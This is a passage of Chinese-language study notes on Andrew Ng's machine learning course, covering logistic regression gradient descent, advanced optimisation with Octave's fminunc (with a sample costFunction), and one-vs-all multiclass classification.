\right)={\theta^T}X={\theta_{0}}{x_{0}}+{\theta_{1}}{x_{1}}+{\theta_{2}}{x_{2}}+...+{\theta_{n}}{x_{n}}$<p>而现在逻辑函数假设函数：</p>${h_\theta}\left( x \right)=\frac{1}{1+{{e}^{-{\theta^T}X}}}$<p>因此，即使更新参数的规则看起来基本相同，但由于假设的定义发生了变化，所以逻辑函数的梯度下降，跟线性回归的梯度下降实际上是两个完全不同的东西。</p><p>在先前的视频中，当我们在谈论线性回归的梯度下降法时，我们谈到了如何监控梯度下降法以确保其收敛，我通常也把同样的方法用在逻辑回归中，来监测梯度下降，以确保它正常收敛。</p><p>当使用梯度下降法来实现逻辑回归时，我们有这些不同的参数$\theta$，就是${\theta_{0}}$ ${\theta_{1}}$ ${\theta_{2}}$ 一直到${\theta_{n}}$，我们需要用这个表达式来更新这些参数。我们还可以使用 for循环来更新这些参数值，用 <code>for i=1 to n</code>，或者 <code>for i=1 to n+1</code>。当然，不用 for循环也是可以的，理想情况下，我们更提倡使用向量化的实现，可以把所有这些 n个参数同时更新。</p><p>最后还有一点，我们之前在谈线性回归时讲到的特征缩放，我们看到了特征缩放是如何提高梯度下降的收敛速度的，这个特征缩放的方法，也适用于逻辑回归。如果你的特征范围差距很大的话，那么应用特征缩放的方法，同样也可以让逻辑回归中，梯度下降收敛更快。</p><p>就是这样，现在你知道如何实现逻辑回归，这是一种非常强大，甚至可能世界上使用最广泛的一种分类算法。</p><h2 id="6-6-高级优化"><a href="#6-6-高级优化" class="headerlink" title="6.6 高级优化"></a>6.6 高级优化</h2><ul><li>在上节课的视频中 用梯度下降的方法最小化 逻辑回归中代价函数 $J(\theta)$ 在这段视频中 教你们一些 高级优化算法和一些 高级的优化概念 利用这些方法 我们就能够 使通过梯度下降 进行逻辑回归的速度 大大提高 而这也将使 算法更加适合解决 大型的机器学习问题</li><li>比如 我们有数目庞大的特征量 现在我们换个角度 来看什么是梯度下降 我们有个代价函数 $J$ 而我们想要使其最小化 那么我们需要做的是 我们需要 编写代码 当输入参数 $\theta$ 时 它们会计算出两样东西 $J(\theta)$ 以及 $J$ 等于 0 1直到 n 时的 偏导数项 假设我们已经完成了 可以实现这两件事的代码 那么梯度下降所做的就是 反复执行这些更新  所以给出我们 用于计算这些的偏导数的代码 梯度下降法就把它插入 到这里 从而来更新参数 $\theta$</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190131102629.png" alt></p><ul><li>因此另一种考虑 梯度下降的思路是 我们需要写出代码 来计算 $J(\theta)$ 和这些偏导数 然后 把这些插入到梯度下降中 然后它就可以为我们最小化这个函数 对于梯度下降来说 我认为 从技术上讲 你实际并不需要编写代码 来计算代价函数  $J(\theta)$ 你只需要编写代码来计算导数项 但是 如果你希望 代码还要能够监控 这些  $J(\theta)$ 的收敛性 那么我们就 需要自己编写代码 来计算 代价函数和偏导数项</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190131102845.png" alt></p><ul><li>所以 在写完能够 计算这两者的代码之后 我们就可以使用梯度下降 但梯度下降并不是我们可以使用的唯一算法 还有其他一些算法 更高级 更复杂 如果我们能用 这些方法来计算 这两个项的话 那么这些算法 就是为我们优化 代价函数的不同方法</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190131102940.png" alt></p><ul><li><p><code>共轭梯度法</code> <code>BFGS (变尺度法)</code> 和 <code>L-BFGS (限制变尺度法)</code> 就是其中 一些更高级的优化算法 它们需要有一种方法来计算 $J(\theta)$ 以及需要一种方法 计算 导数项 然后使用比梯度下降更复杂 的算法来最小化代价函数</p></li><li><p>这三种算法的具体细节 超出了本门课程的范畴 实际上你最后通常会 花费很多天 或几周时间研究这些算法 你可以专门学一门课来提高数值计算能力 不过让我来告诉你他们的一些特性</p></li><li><p>这三种算法有许多优点 一个是 使用这其中任何一个算法 你通常 不需要手动选择学习率$\alpha$</p></li></ul><p>所以对于 这些算法的一种思路是 给出 计算导数项和代价函数的方法 你可以认为算法有一个智能的内部循环 而且 事实上 他们确实有一个智能的内部循环 称为<code>线性搜索(line search)</code>算法 它可以自动 尝试不同的 学习速率 $\alpha$ 并自动 选择一个好的学习速率 $\alpha$ 因此它甚至可以 为每次迭代选择不同的学习速率 那么你就不需要自己选择</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190131103241.png" alt></p><ul><li><p>这些算法实际上在做 更复杂的事情 而不仅仅是 选择一个好的学习速率 所以它们往往最终 收敛得远远快于梯度下降 不过 关于它们到底做什么的详细讨论 已经超过了本门课程的范围 实际上 我过去 使用这些算法 已经很长一段时间了 也许超过 十年了 使用得相当频繁 而直到几年前 我才真正 搞清楚 共轭梯度法 BFGS 和 L-BFGS的细节 因此 实际上完全有可能 成功使用这些算法 并应用于许多不同的学习 问题 而不需要真正理解 这些算法的内环间在做什么</p></li><li><p>如果说这些算法有缺点的话 那么我想说主要 缺点是它们比 梯度下降法复杂多了 特别是你最好 不要使用 L-BGFS BFGS这些算法 共轭梯度 L-BGFS BFGS 除非你是数值计算方面的专家</p></li><li><p>实际上 我不会建议你们编写 自己的代码来计算 数据的平方根或者 计算逆矩阵 因为对于这些算法我 还是会建议你直接使用一个软件库 所以 要求一个平方根 我们所能做的 就是调用一些 别人已经 写好用来计算数字平方根的函数 幸运的是 有 Octave 和 与它密切相关的 MATLAB 语言 我们将会用到它们 Octave 有一个非常 理想的库用于实现这些先进的优化算法 所以 如果你直接调用 它自带的库 你就能得到不错的结果</p></li><li><p>我必须指出 这些算法 实现得好或不好是有区别的 因此 如果你正在你的 机器学习程序中使用一种不同的语言 比如如果你正在使用 C C + + Java 等等 你 可能会想尝试一些 不同的库 以确保你找到一个 能很好实现这些算法的库 因为 在 L-BFGS 或者等高线梯度的 实现上 表现得好与不太好 是有差别的</p></li><li><p>因此现在让我们来说明 如何使用这些算法 我打算举一个例子 比方说 你有一个 含两个参数的问题 这两个参数是 $\theta_1$ 和 $\theta_2$ 那么你的成本函数 $J(\theta)$ 等于 $\theta_1$ 减去5的平方 再加上 $\theta_2$减5的平方 因此 通过这个代价函数 你可以得到 $\theta_1$ 和 $\theta_2$ 的值 如果你将 $J(\theta)$ 最小化的话 那么它的最小值 将是 $\theta_1$ 等于5 $\theta_2$  等于5</p></li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190131110353.png" alt></p><ul><li>我知道你们当中 有些人比别人微积分更好 但是你应该知道代价函数 $J$ 的导数 推出来就是这两个表达式 我已经写在这儿了</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190131110414.png" alt></p><ul><li>那么你就可以应用 高级优化算法里的一个 来最小化代价函数 $J$ 所以 如果我们 不知道最小值 是5 5 但你想要 代价函数找到这个最小值 是用比如 梯度下降这些算法 但最好是用 比它更高级的算法 你要做的就是运行一个 像这样的 Octave 函数</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190131110703.png" alt></p><ul><li>那么我们 运行一个函数 比如 costFunction 这个函数的作用就是 它会返回两个值 第一个是 jVal 它是 我们计算的代价函数 J 所以说 jVal 等于 theta(1) 减5的平方加 theta(2) 减5的平方 这样就计算出这个代价函数函数返回的第二个值是 梯度值 梯度值应该是 一个2×1的向量 梯度向量的两个元素 对应 这里的两个偏导数项</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190131110805.png" alt></p><ul><li>运行这个 costFunction 函数后 你就可以 调用高级的优化函数 这个函数叫 <code>fminunc</code> 它表示 Octave 里<code>无约束最小化函数</code></li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190131110904.png" alt></p><ul><li>调用它的方式如下 你要设置几个 options 这个 options 变量 作为一个数据结构可以存储你想要的 options 所以 GradObj 和 On 这里设置梯度目标参数为打开(on) 这意味着你现在确实要给这个算法提供一个梯度 然后设置最大 迭代次数 比方说 100 我们给出一个 $\theta$ 的猜测初始值 它是一个2×1的向量 那么这个命令就调用 fminunc 这个@符号表示 指向我们刚刚定义的 costFunction 函数的指针 如果你调用它 它就会 使用众多高级优化算法中的一个 当然你也可以把它当成梯度下降 只不过它能自动选择 学习速率α 你不需要自己来做 然后它会尝试 使用这些高级的优化算法 就像加强版的梯度下降法 为你找到最佳的 θ 值</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190131111053.png" alt></p><ul><li>让我告诉你它在 Octave 里什么样 所以我写了这个关于theta的 的 costFunction 函数 跟前面幻灯片中一样 它计算出代价函数 jval 以及梯度 gradient gradient 有两个元素 是代价函数对于 theta(1) 和 theta(2) 这两个参数的 偏导数</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190131111120.png" alt></p><ul><li>现在 让我们切换到Octave窗口 我把刚刚的命令敲进去 <code>options = optimset</code> 这是 在我的优化算法的 options上 设置参数 的记号 这样就是100 次迭代 我现在要给我的算法提供梯度值 设置 theta 的初始值是一个2×1的零向量 这是我猜测的 theta 初始值 现在我就可以 写出三个返回值 <code>[optTheta, functionVal, exitFlag]</code> 等于 指向代价函数的指针 @costFunction 我猜测的初始值 initialTheta 还有options 如果我敲回车 这个就会运行优化算法</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190131111254.png" alt></p><ul><li><p>它很快返回值 这个格式很有意思 因为我的代码 是被缠住了 所以这个有点意思 完全是因为我的命令行被绕住了 不过这里只是 数字上的一些问题 把它看成是加强版梯度下降 它们找到 theta 的最优值 是 theta(1) 为5 theta(2) 也为5 这正是我们希望的 functionVal 的值 实际上是10的-30次幂 所以 这基本上就是0 这也是我们所希望的 exitFlag为1 这说明它的状态 是已经收敛了的 你也可以运行 help fminunc 命令 去查阅相关资料 以理解 exitFlag 的作用 exitFlag可以让你确定该算法是否已经收敛 这就是在 Octave 里运行这些算法的过程</p></li><li><p>哦对了 这里我得指出 用 Octave 运行的时候 向量θ的值 θ的参数向量 必须是 d 维的 d 大于等于2 所以 θ 仅仅是一个实数 因此如果它不是 一个至少二维的向量 或高于二维的向量 fminunc 就可能无法运算 因此如果你有一个 一维的函数需要优化 一维的函数需要优化 你可以查找 Octave 里 fminuc 函数的资料 来得到更多的细节 来得到更多的细节</p></li><li><p>这就是我们如何优化 一个例子的过程 这是一个 简单的二次代价函数 我们如果把它应用到逻辑回归中呢</p></li><li><p>在逻辑回归中 我们有 一个参数向量 theta 我要混合使用 Octave 记号和数学符号 我希望这个写法很明确 我们的参数 theta 由 $\theta_0$到 $\theta_n$ 组成 由 $\theta_0$到 $\theta_n$ 组成 因为在 Octave 的标号中 向量的标号是从1开始的 在 Octave 里 $\theta_0$实际上 写成 theta(1) 因此用 theta(1) 表示第一个参数 $\theta_0$ 然后有 theta(2) 接下来写到 theta(n+1) 对吧 这是因为 Octave 的记号 是向量从1开始的 而不是从0开始</p></li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190131111724.png" alt></p><ul><li>因此 我们需要 做的是写一个 costFunction 函数 它为 逻辑回归求得代价函数 具体点说 costFunction 函数 需要返回 jVal 值 因此需要一些代码 来计算 J(θ) 我们也需要给出梯度值 gradient 那么 gradient(1) 对应用来计算代价函数 关于 θ0 的偏导数 接下去关于 θ1 的偏导数 依此类推 再次强调 这 是gradient(1) gradient(2) 等等 而不是gradient(0) gradient(1) 因为 Octave 的标号 是从1开始 而不是从0开始的</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190131111814.png" alt></p><ul><li><p>我希望你们从这个幻灯片中 学到的主要内容是 你所要做的是 写一个函数 它能返回代价函数值 以及梯度值 因此要把这个 应用到逻辑回归 或者甚至线性回归中 你也可以把这些优化算法用于线性回归 你需要做的就是输入 合适的代码来计算 这里的这些东西 现在你已经知道如何使用这些高级的优化算法 有了这些算法 你就可以使用一个 复杂的优化库 它让算法使用起来更模糊一点 more opaque and so 因此也许稍微有点难调试 不过由于这些算法的运行速度 通常远远超过梯度下降 因此当我有一个很大的 机器学习问题时 我会选择这些高级算法 而不是梯度下降 有了这些概念 你就应该能将逻辑回归 和线性回归应用于 更大的问题中 这就是高级优化的概念</p></li><li><p>在下一个视频 也就是逻辑回归这一部分的最后一个视频中 我想要告诉你如何 修改你已经知道的逻辑回归算法 然后使它在多类别分类问题中 也能正常运行</p></li></ul><h3 id="小小的总结–高级优化"><a href="#小小的总结–高级优化" class="headerlink" title="小小的总结–高级优化"></a>小小的总结–高级优化</h3><p>在上一个视频中，我们讨论了用梯度下降的方法最小化逻辑回归中代价函数$J\left( \theta  \right)$。在本次视频中，我会教你们一些高级优化算法和一些高级的优化概念，利用这些方法，我们就能够使通过梯度下降，进行逻辑回归的速度大大提高，而这也将使算法更加适合解决大型的机器学习问题，比如，我们有数目庞大的特征量。<br>现在我们换个角度来看什么是梯度下降，我们有个代价函数$J\left( \theta  \right)$，而我们想要使其最小化，那么我们需要做的是编写代码，当输入参数 $\theta$ 时，它们会计算出两样东西：$J\left( \theta  \right)$ 以及$J$ 等于 0、1直到 $n$ 时的偏导数项。</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104214702.png" alt></p><p>假设我们已经完成了可以实现这两件事的代码，那么梯度下降所做的就是反复执行这些更新。<br>另一种考虑梯度下降的思路是：我们需要写出代码来计算$J\left( \theta  \right)$ 和这些偏导数，然后把这些插入到梯度下降中，然后它就可以为我们最小化这个函数。<br>对于梯度下降来说，我认为从技术上讲，你实际并不需要编写代码来计算代价函数$J\left( \theta  \right)$。你只需要编写代码来计算导数项，但是，如果你希望代码还要能够监控这些$J\left( \theta  \right)$ 的收敛性，那么我们就需要自己编写代码来计算代价函数$J(\theta)$和偏导数项$\frac{\partial }{\partial {\theta_j}}J\left( \theta  \right)$。所以，在写完能够计算这两者的代码之后，我们就可以使用梯度下降。<br>然而梯度下降并不是我们可以使用的唯一算法，还有其他一些算法，更高级、更复杂。如果我们能用这些方法来计算代价函数$J\left( \theta  \right)$和偏导数项$\frac{\partial }{\partial {\theta_j}}J\left( \theta  \right)$两个项的话，那么这些算法就是为我们优化代价函数的不同方法，<code>共轭梯度法 BFGS (变尺度法)</code> 和<code>L-BFGS (限制变尺度法)</code> 就是其中一些更高级的优化算法，它们需要有一种方法来计算 $J\left( \theta  \right)$，以及需要一种方法计算导数项，然后使用比梯度下降更复杂的算法来最小化代价函数。这三种算法的具体细节超出了本门课程的范畴。实际上你最后通常会花费很多天，或几周时间研究这些算法，你可以专门学一门课来提高数值计算能力，不过让我来告诉你他们的一些特性：</p><p>这三种算法有许多<code>优点</code>：</p><p>一个是使用这其中任何一个算法，你通常<strong>不需要手动选择学习率 $\alpha$</strong>，所以对于这些算法的一种思路是，给出计算导数项和代价函数的方法，你可以认为算法有一个智能的内部循环，而且，事实上，他们确实有一个智能的内部循环，称为<code>线性搜索(line search)</code>算法，它可以自动尝试不同的学习速率 $\alpha$，并自动选择一个好的学习速率 $\alpha$，因此它甚至可以为每次迭代选择不同的学习速率，那么你就不需要自己选择。这些算法实际上在做更复杂的事情，而不仅仅是选择一个好的学习率，所以它们往往最终收敛得远远快于梯度下降，这些算法实际上在做更复杂的事情，不仅仅是选择一个好的学习速率，所以它们往往最终比梯度下降收敛得快多了，不过关于它们到底做什么的详细讨论，已经超过了本门课程的范围。</p><p>实际上，我过去使用这些算法已经很长一段时间了，也许超过十年了，使用得相当频繁，而直到几年前我才真正搞清楚共轭梯度法 BFGS 和 L-BFGS的细节。</p><p>我们实际上完全有可能成功使用这些算法，并应用于许多不同的学习问题，而不需要真正理解这些算法的内环间在做什么，如果说这些算法有缺点的话，那么我想说主要缺点是它们比梯度下降法复杂多了，特别是你最好不要使用 L-BGFS、BFGS这些算法，除非你是数值计算方面的专家。实际上，我不会建议你们编写自己的代码来计算数据的平方根，或者计算逆矩阵，因为对于这些算法，我还是会建议你直接使用一个软件库，比如说，要求一个平方根，我们所能做的就是调用一些别人已经写好用来计算数字平方根的函数。幸运的是现在我们有Octave 和与它密切相关的 MATLAB 语言可以使用。</p><p>Octave 有一个非常理想的库用于实现这些先进的优化算法，所以，如果你直接调用它自带的库，你就能得到不错的结果。我必须指出这些算法实现得好或不好是有区别的，因此，如果你正在你的机器学习程序中使用一种不同的语言，比如如果你正在使用C、C++、Java等等，你可能会想尝试一些不同的库，以确保你找到一个能很好实现这些算法的库。因为在L-BFGS或者等高线梯度的实现上，表现得好与不太好是有差别的，因此现在让我们来说明：如何使用这些算法：</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104214713.png" alt></p><p>比方说，你有一个含两个参数的问题，这两个参数是${\theta_{0}}$和${\theta_{1}}$，因此，通过这个代价函数，你可以得到${\theta_{1}}$和 ${\theta_{2}}$的值，如果你将$J\left( \theta  \right)$ 最小化的话，那么它的最小值将是${\theta_{1}}$等于5 ，${\theta_{2}}$等于5。代价函数$J\left( \theta  \right)$的导数推出来就是这两个表达式：</p>$\frac{\partial }{\partial {{\theta }_{1}}}J(\theta)=2({{\theta }_{1}}-5)$$\frac{\partial }{\partial {{\theta }_{2}}}J(\theta)=2({{\theta }_{2}}-5)$<p><strong>如果我们不知道最小值，但你想要代价函数找到这个最小值，是用比如梯度下降这些算法，但最好是用比它更高级的算法</strong>，你要做的就是运行一个像这样的Octave 函数：</p><pre class=" language-octave"><code class="language-octave">function [jVal, gradient]=costFunction(theta)        % jVal是代价函数　　jVal=(theta(1)-5)^2+(theta(2)-5)^2;　　gradient=zeros(2,1);　　gradient(1)=2*(theta(1)-5);　　gradient(2)=2*(theta(2)-5);end</code></pre><p>这样就计算出这个<code>代价函数</code>，函数返回的第二个值是<code>梯度值</code>，梯度值应该是一个<code>2×1</code>的向量，梯度向量的两个元素对应这里的<code>两个偏导数项</code>，运行这个costFunction 函数后，你就可以调用高级的优化函数，这个函数叫<br><code>fminunc</code>，它表示Octave 里<code>无约束最小化函数</code>。调用它的方式如下：</p><pre class=" language-octave"><code class="language-octave">% GradObj on:表示要传入一个梯度% MaxIter 100:表示最大迭代次数是100options=optimset('GradObj','on','MaxIter',100);% 这里是theta的猜测初始值initialTheta=zeros(2,1);% optTheta:最小化代价函数的theta% functionVal:用了optTheta后,代价函数的值% exitFlag:如果是1表示已经收敛[optTheta, functionVal, exitFlag]=fminunc(@costFunction, initialTheta, options);</code></pre><p>你要设置几个<code>options</code>，这个 options 变量作为一个数据结构可以存储你想要的options，所以<code>GradObj</code> 和<code>On</code>，这里<strong>设置梯度目标参数为打开(on)</strong>，这意味着<strong>你现在确实要给这个算法提供一个梯度</strong>，然后<strong>设置最大迭代次数</strong>，比方说100，我们给出一个<strong>$\theta$ 的猜测初始值</strong>，它是一个2×1的向量，那么这个命令就调用<code>fminunc</code>，这个<code>@</code>符号表示指向我们刚刚定义的costFunction 函数的指针。如果你调用它，它就会使用众多高级优化算法中的一个，当然你也可以把它当成梯度下降，只不过它能自动选择学习速率$\alpha$，你不需要自己来做。然后它会尝试使用这些高级的优化算法，就像加强版的梯度下降法，为你找到最佳的${\theta}$值。</p><p>让我告诉你它在 Octave 里什么样：</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104214738.png" alt></p><p>所以我写了这个关于theta的 costFunction 函数，它计算出代价函数 jval以及梯度gradient，gradient 有两个元素，是代价函数对于theta(1) 和 theta(2)这两个参数的偏导数。</p><p><strong>注意:theta至少是一个二维向量</strong></p><p>我希望你们从这个幻灯片中学到的主要内容是：写一个函数，它能返回代价函数值、梯度值，因此要把这个应用到逻辑回归，或者甚至线性回归中，你也可以把这些优化算法用于线性回归，你需要做的就是输入合适的代码来计算这里的这些东西。</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104214746.png" alt></p><p>现在你已经知道如何使用这些高级的优化算法，有了这些算法，你就可以使用一个复杂的优化库，它让算法使用起来更模糊一点。因此也许稍微有点难调试，不过由于这些算法的运行速度通常远远超过梯度下降。</p><p>所以当我有一个很大的机器学习问题时，我会选择这些高级算法，而不是梯度下降。有了这些概念，你就应该能将逻辑回归和线性回归应用于更大的问题中，这就是高级优化的概念。</p><p>在下一个视频，我想要告诉你如何修改你已经知道的逻辑回归算法，然后使它在多类别分类问题中也能正常运行。</p><h2 id="6-7-多类别分类：一对多"><a href="#6-7-多类别分类：一对多" class="headerlink" title="6.7 多类别分类：一对多"></a>6.7 多类别分类：一对多</h2><ul><li><p>在本节视频中 我们将谈到如何使用<code>逻辑回归 (logistic regression)</code>来解决多类别分类问题 具体来说 我想通过一个叫做<code>&quot;一对多&quot; (one-vs-all)</code>的分类算法 让你了解什么是<code>多类别分类问题</code></p></li><li><p>先看这样一些例子 假如说你现在需要 一个学习算法 能自动地 将邮件归类到不同的文件夹里 或者说可以自动地加上标签 那么 你也许需要一些不同的文件夹 或者不同的标签来完成这件事 来区分开来自工作的邮件、来自朋友的邮件 来自家人的邮件或者是有关兴趣爱好的邮件 那么 我们就有了 这样一个分类问题 其类别有四个 分别用y=1、y=2、y=3、 y=4 来代表</p></li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190131113147.png" alt></p><ul><li>另一个例子是有关药物诊断的 如果一个病人 因为鼻塞 来到你的诊所 他可能并没有生病 用 y=1 这个类别来代表 或者患了感冒 用 y=2 来代表 或者得了流感 y=3</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190131113226.png" alt></p><ul><li>第三个例子 也是最后一个例子 如果你正在做有关 天气的机器学习分类问题 那么你可能想要区分 哪些天是晴天、多云、雨天、 或者下雪天 对上述所有的例子 y 可以取 一个很小的数值 一个相对”谨慎”的数值 比如1到3、1到4或者其它数值 以上说的都是多类分类问题</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190131113300.png" alt></p><ul><li><p>顺便一提的是 对于下标是 0 1 2 3 还是 1 2 3 4 都不重要 我更喜欢将分类 从 1 开始标而不是 0 其实怎样标注都不会影响最后的结果</p></li><li><p>然而对于之前的一个 二元分类问题 我们的数据看起来可能是像左边这样 对于一个多类分类问题 我们的数据集 或许看起来像右边这样 我用三种不同的符号来代表三个类别 问题就是 给出三个类型的数据集 这是一个类别中的样本 而这个样本是属于 另一个类别 而这个样本属于第三个类别 我们如何得到一个学习算法来进行分类呢？ 我们现在已经知道如何 进行二元分类 可以使用逻辑斯特回归 对于直线或许你也知道 可以将数据集一分为二为正类和负类 用一对多的 分类思想 我们可以 将其用在多类分类问题上</p></li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190131113420.png" alt></p><ul><li>下面将介绍如何进行一对多的分类工作 有时这个方法也被称为”<code>一对余(one versus rest)</code>“方法 现在我们有一个训练集 好比左边表示的 有三个类别 我们用三角形表示 y=1 方框表示 y=2 叉叉表示 y=3</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190131114036.png" alt></p><ul><li>我们下面要做的就是 使用一个训练集 将其分成三个二元分类问题 所以我将它分成三个 二元分类问题 我们先从用三角形代表的类别1开始 实际上我们可以创建一个 新的”伪”训练集 <strong>类型2和类型3 定为负类 类型1 设定为正类</strong> 我们创建一个新的 训练集 如右侧所示的那样 我们要拟合出一个合适的分类器 我们称其为 h 下标 θ 上标(1) (x) 这里的三角形是正样本 而圆形代表负样本 可以这样想 设置三角形的值为1 圆形的值为0 下面我们来训练一个标准的 逻辑回归分类器 这样我们就得到一个正边界 对吧? <strong>这里上标(1)表示类别1</strong> 我们可以像这样对三角形类别这么做</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190131114250.png" alt></p><ul><li>下面 我们将为类别2做同样的工作 取这些方块样本 然后将这些方块 作为正样本 设其它的为三角形和叉形类别为负样本 这样我们找到第二个合适的逻辑回归分类器 我们称为 h 下标 θ 上标(2) (x) 其中上标(2)表示 是类别2 所以我们做的就是 把方块类当做正样本 我们可能便会得到这样的一个分类器</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190131114342.png" alt></p><ul><li>最后 同样地 我们对第三个类别采用同样的方法 并找出 第三个分类器 h 下标 θ 上标(3) (x)</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190131114507.png" alt></p><ul><li>或许这么做 可以给出一个像这样的 判别边界 或者说分类器 能这样分开正负样本 总而言之 我们已经拟合出三个分类器 对于 i 等于1、2、3 我们都找到了一个分类器 $h^{(i)}_\theta(x)$ 通过这样来尝试 估计出 <strong>给出 x 和 θ 时 y的值等于 i 的概率</strong> 对么？</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190131114706.png" alt></p><ul><li>在一开始 对于第一个在这里的 分类器 完成了对三角形的识别 把三角形当做是正类别 所以 $h^{(1)}$ 实际上是在计算 <strong>给定x 以 $\theta$ 为参数时 y的值为1的 概率是多少</strong></li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190131114810.png" alt></p><ul><li><p>同样地 这个也是这么处理 矩形类型当做一个正类别 同样地 可以计算出 y=2 的概率和其它的概率值来 现在我们便有了三个分类器 且每个分类器都作为其中一种情况进行训练</p></li><li><p>总之 我们已经把要做的做完了 现在要做的就是训练这个 逻辑回归分类器 $h^{(i)}_\theta$  其中 $i$ 对应每一个可能的 $y=i$</p></li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190131115214.png" alt></p><ul><li>最后 为了做出预测 我们给出输入一个新的 x 值 用这个做预测 我们要做的 就是 <strong>在我们三个分类器 里面输入 x 然后 我们选择一个让 h 最大的 i</strong> 你现在知道了 基本的挑选分类器的方法 选择出哪一个分类器是 可信度最高效果最好的 那么就可认为得到一个正确的分类 无论i值是多少 我们都有最高的概率值 我们预测 y 就是那个值</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190131115350.png" alt></p><ul><li>这就是多类别分类问题 以及一对多的方法 通过这个小方法 你现在也可以将 逻辑回归分类器 用在多类分类的问题上</li></ul><h3 id="小小的总结–一对多"><a href="#小小的总结–一对多" class="headerlink" title="小小的总结–一对多"></a>小小的总结–一对多</h3><p>在本节视频中，我们将谈到如何使用<code>逻辑回归 (logistic regression)</code>来解决<strong>多类别分类</strong>问题，具体来说，我想通过一个叫做<code>&quot;一对多&quot; (one-vs-all)</code> 的分类算法。</p><p>先看这样一些例子。</p><p>第一个例子：假如说你现在需要一个学习算法能自动地将邮件归类到不同的文件夹里，或者说可以自动地加上标签，那么，你也许需要一些不同的文件夹，或者不同的标签来完成这件事，来区分开来自工作的邮件、来自朋友的邮件、来自家人的邮件或者是有关兴趣爱好的邮件，那么，我们就有了这样一个分类问题：其类别有四个，分别用$y=1$、$y=2$、$y=3$、$y=4$ 来代表。</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104214759.png" alt></p><p>第二个例子是有关药物诊断的，如果一个病人因为鼻塞来到你的诊所，他可能并没有生病，用 $y=1$ 这个类别来代表；或者患了感冒，用 $y=2$ 来代表；或者得了流感用$y=3$来代表。</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104214807.png" alt></p><p>第三个例子：如果你正在做有关天气的机器学习分类问题，那么你可能想要区分哪些天是晴天、多云、雨天、或者下雪天，对上述所有的例子，$y$ 可以取一个很小的数值，一个相对”谨慎”的数值，比如1 到3、1到4或者其它数值，以上说的都是多类分类问题，顺便一提的是，对于下标是0 1 2 3，还是 1 2 3 4 都不重要，我更喜欢将分类从 1 开始标而不是0，其实怎样标注都不会影响最后的结果。</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104214814.png" alt></p><p>然而对于之前的一个，二元分类问题，我们的数据看起来可能是像这样：</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104214821.png" alt></p><p>对于一个多类分类问题，我们的数据集或许看起来像这样：</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104214829.png" alt></p><p>我用三种不同的符号来代表三个类别，问题就是给出三个类型的数据集，我们如何得到一个学习算法来进行分类呢？</p><p>我们现在已经知道如何进行<code>二元分类</code>，可以使用<code>逻辑回归</code>，对于直线或许你也知道，可以将数据集一分为二为正类和负类。用一对多的分类思想，我们可以将其用在多类分类问题上。</p><p>下面将介绍如何进行一对多的分类工作，有时这个方法也被称为”一对余”方法。</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104214838.png" alt></p><p>现在我们有一个训练集，好比上图表示的有三个类别，我们用三角形表示 $y=1$，方框表示$y=2$，叉叉表示 $y=3$。我们下面要做的就是<strong>使用一个训练集，将其分成三个二元分类问题</strong>。</p><p>我们先从用三角形代表的类别1开始，实际上我们可以创建一个，新的<code>&quot;伪&quot;训练集</code>，类型2和类型3定为<code>负类</code>，类型1设定为<code>正类</code>，我们创建一个新的训练集，如下图所示的那样，我们要拟合出一个合适的分类器。</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104214847.png" alt></p><p>这里的三角形是正样本，而圆形代表负样本。可以这样想，设置三角形的值为1，圆形的值为0，下面我们来训练一个标准的<code>逻辑回归分类器</code>，这样我们就得到一个正边界。</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181104214854.png" alt></p><p>为了能实现这样的转变，我们<strong>将多个类中的一个类标记为正向类（$y=1$），然后将其他所有类都标记为负向类</strong>，这个模型记作$h_\theta^{\left( 1 \right)}\left( x \right)$。接着，类似地第我们选择另一个类标记为正向类（y=2），再将其它类都标记为负向类，将这个模型记作 $h_\theta^{\left( 2 \right)}\left( x \right)$,依此类推。</p><p><img 